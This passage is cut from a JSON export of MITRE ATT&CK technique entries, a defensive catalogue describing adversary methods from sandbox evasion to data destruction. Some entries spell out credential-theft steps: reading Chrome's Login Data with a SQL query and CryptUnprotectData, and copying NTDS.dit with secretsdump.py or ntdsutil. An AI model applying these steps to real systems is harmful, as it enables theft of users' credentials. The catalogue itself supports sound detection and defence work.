\"attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517\"}, \"attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-19T21:27:32.820Z\", \"name\": \"Indicator Removal from Tools\", \"attack_pattern_identifier\": \"T1027.005\", \"description\": \"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\\n\\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.\", \"modified\": \"2020-03-29T21:03:09.766Z\", \"id\": \"attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92\"}, \"attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-20T21:01:25.428Z\", \"name\": \"Archive via Utility\", \"attack_pattern_identifier\": \"T1560.001\", \"modified\": \"2020-03-25T21:54:37.374Z\", \"description\": \"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip(Citation: 7zip Homepage), WinRAR(Citation: WinRAR Homepage), and WinZip(Citation: WinZip Homepage). Most utilities include functionality to encrypt and/or compress data.\\n\\nSome 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.\", \"id\": \"attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662\"}, \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-04-17T22:22:24.505Z\", \"name\": \"Virtualization/Sandbox Evasion\", \"attack_pattern_identifier\": \"T1497\", \"modified\": \"2020-07-01T16:32:02.272Z\", \"description\": \"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. \\n\\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)\\n\\n\", \"id\": \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\"}, \"attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-12T18:57:36.041Z\", \"name\": \"Credentials from Web Browsers\", \"attack_pattern_identifier\": \"T1555.003\", \"modified\": \"2020-02-17T13:20:02.386Z\", \"description\": \"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\\n\\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\\u2019s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData \\u200eApril 2018)\\n \\nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)\\n\\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\\n\\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).\", \"id\": \"attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8\"}, \"attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-16T15:48:33.882Z\", \"name\": \"Asymmetric Cryptography\", \"attack_pattern_identifier\": \"T1573.002\", \"modified\": \"2020-03-30T00:37:16.593Z\", \"description\": \"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\\n\\nFor efficiency, may protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).\", \"id\": \"attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada\"}, \"attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-12T19:29:21.013Z\", \"name\": \"Local Groups\", \"attack_pattern_identifier\": \"T1069.001\", \"description\": \"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\\n\\nCommands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.\", \"modified\": \"2020-03-26T17:48:27.871Z\", \"id\": \"attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b\"}, \"attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:44.329Z\", \"name\": \"Windows Management Instrumentation\", \"attack_pattern_identifier\": \"T1047\", \"description\": \"Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\\n\\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)\", \"modified\": \"2020-05-13T22:50:51.258Z\", \"id\": \"attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055\"}, \"attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-02T18:45:07.892Z\", \"name\": \"Phishing\", \"attack_pattern_identifier\": \"T1566\", \"description\": \"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\\n\\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems or to gather credentials for use of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Phishing may also be conducted via third-party services, like social media platforms.\", \"modified\": \"2020-10-18T01:55:03.337Z\", \"id\": \"attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b\"}, \"attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-10-01T01:30:00.877Z\", \"name\": \"Develop Capabilities\", \"attack_pattern_identifier\": \"T1587\", \"description\": \"Before compromising a victim, adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)\\n\\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.\", \"modified\": \"2020-10-22T18:18:08.552Z\", \"id\": \"attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf\"}, \"attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-05T14:54:07.588Z\", \"name\": \"Subvert Trust Controls\", \"attack_pattern_identifier\": \"T1553\", \"description\": \"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\\n\\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) \", \"modified\": \"2020-06-20T22:42:26.314Z\", \"id\": \"attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7\"}, \"attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-14T18:18:32.443Z\", \"name\": \"Non-Standard Port\", \"attack_pattern_identifier\": \"T1571\", \"description\": \"Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\", \"modified\": \"2020-03-26T22:02:25.221Z\", \"id\": \"attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18\"}, \"attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-13T20:33:00.009Z\", \"name\": \"NTFS File Attributes\", \"attack_pattern_identifier\": \"T1564.004\", \"description\": \"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\\n\\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)\", \"modified\": \"2020-03-29T22:46:56.308Z\", \"id\": \"attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5\"}, \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-26T17:41:25.933Z\", \"name\": \"Hide Artifacts\", \"attack_pattern_identifier\": \"T1564\", \"description\": \"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\\n\\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)\", \"modified\": \"2020-09-23T11:31:50.636Z\", \"id\": \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\"}, \"attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-11T19:12:46.830Z\", \"name\": \"Steal or Forge Kerberos Tickets\", \"attack_pattern_identifier\": \"T1558\", \"description\": \"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). \\n\\nKerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \\u201crealms\\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\", \"modified\": \"2020-09-29T16:16:06.868Z\", \"id\": \"attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a\"}, \"attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-30T17:48:49.395Z\", \"name\": \"Web Session Cookie\", \"attack_pattern_identifier\": \"T1550.004\", \"description\": \"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)\\n\\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\\n\\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)\", \"modified\": \"2020-09-16T19:40:44.527Z\", \"id\": \"attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0\"}, \"attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-10-01T01:56:24.776Z\", \"name\": \"Obtain Capabilities\", \"attack_pattern_identifier\": \"T1588\", \"description\": \"Before compromising a victim, adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\\n\\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)\\n\\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)\", \"modified\": \"2020-10-22T18:22:21.135Z\", \"id\": \"attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1\"}, \"attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-10T19:55:29.385Z\", \"name\": \"Right-to-Left Override\", \"attack_pattern_identifier\": \"T1036.002\", \"modified\": \"2020-03-29T20:16:36.316Z\", \"description\": \"Adversaries may use the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver executable named <code>March 25 \\\\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.\\n\\nA common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.\", \"id\": \"attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69\"}, \"attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:48.323Z\", \"name\": \"Input Capture\", \"attack_pattern_identifier\": \"T1056\", \"description\": \"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).\", \"modified\": \"2020-10-21T01:31:35.760Z\", \"id\": \"attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2\"}, \"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-12T20:38:12.465Z\", \"name\": \"Hijack Execution Flow\", \"attack_pattern_identifier\": \"T1574\", \"description\": \"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\\n\\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.\", \"modified\": \"2020-10-17T15:15:28.288Z\", \"id\": \"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\"}, \"attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:21.315Z\", \"name\": \"System Service Discovery\", \"attack_pattern_identifier\": \"T1007\", \"modified\": \"2020-03-15T01:05:08.805Z\", \"description\": \"Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \\\"sc,\\\" \\\"tasklist /svc\\\" using [Tasklist](https://attack.mitre.org/software/S0057), and \\\"net start\\\" using [Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as well. Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\", \"id\": \"attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa\"}, \"attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-21T21:07:55.393Z\", \"name\": \"Local Account\", \"attack_pattern_identifier\": \"T1087.001\", \"description\": \"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\\n\\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file.\", \"modified\": \"2020-03-20T19:39:59.544Z\", \"id\": \"attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e\"}, \"attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:27.342Z\", \"name\": \"System Network Configuration Discovery\", \"attack_pattern_identifier\": \"T1016\", \"description\": \"Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\\n\\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\", \"modified\": \"2020-03-15T00:55:33.136Z\", \"id\": \"attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0\"}, \"attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-06-28T17:52:07.296Z\", \"name\": \"Server Software Component\", \"attack_pattern_identifier\": \"T1505\", \"description\": \"Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.\", \"modified\": \"2020-09-16T19:34:19.961Z\", \"id\": \"attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb\"}, \"attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:42:35.572Z\", \"name\": \"NTDS\", \"attack_pattern_identifier\": \"T1003.003\", \"modified\": \"2020-03-24T20:39:39.949Z\", \"description\": \"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\\\NTDS\\\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\\n\\nIn addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\\n\\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\\n\\n* Volume Shadow Copy\\n* secretsdump.py\\n* Using the in-built Windows tool, ntdsutil.exe\\n* Invoke-NinjaCopy\\n\", \"id\": \"attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24\"}, \"attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-03-14T18:47:17.701Z\", \"name\": \"Data Destruction\", \"attack_pattern_identifier\": \"T1485\", \"description\": \"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\\n\\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\\n\\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018)\", \"modified\": \"2020-03-27T21:08:19.783Z\", \"id\": \"attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c\"}, \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-01-22T21:04:23.285Z\", \"name\": \"Event Triggered Execution\", \"attack_pattern_identifier\": \"T1546\", \"description\": \"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. \\n\\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\\n\\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. \", \"modified\": \"2020-10-21T18:48:27.576Z\", \"id\": \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\"}, \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Signed Binary Proxy Execution\", \"attack_pattern_identifier\": \"T1218\", \"description\": \"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\", \"modified\": \"2020-10-21T18:37:15.275Z\", \"id\": \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\"}, \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:56.776Z\", \"name\": \"Application Layer Protocol\", \"attack_pattern_identifier\": \"T1071\", \"description\": \"Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. \", \"modified\": \"2020-10-21T16:35:45.986Z\", \"id\": \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\"}, \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:10.728Z\", \"name\": \"Non-Application Layer Protocol\", \"attack_pattern_identifier\": \"T1095\", \"modified\": \"2020-10-21T19:41:49.412Z\", \"description\": \"Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\\n\\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution)\\n Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\", \"id\": \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\"}, \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-20T20:53:45.725Z\", \"name\": \"Archive Collected Data\", \"attack_pattern_identifier\": \"T1560\", \"description\": \"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\\n\\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.\", \"modified\": \"2020-10-21T16:36:55.831Z\", \"id\": \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\"}, \"attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:29.858Z\", \"name\": \"Remote Services\", \"attack_pattern_identifier\": \"T1021\", \"modified\": \"2020-03-25T12:25:03.251Z\", \"description\": \"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\\n\\nIn an enterprise environment, servers and workstations can be 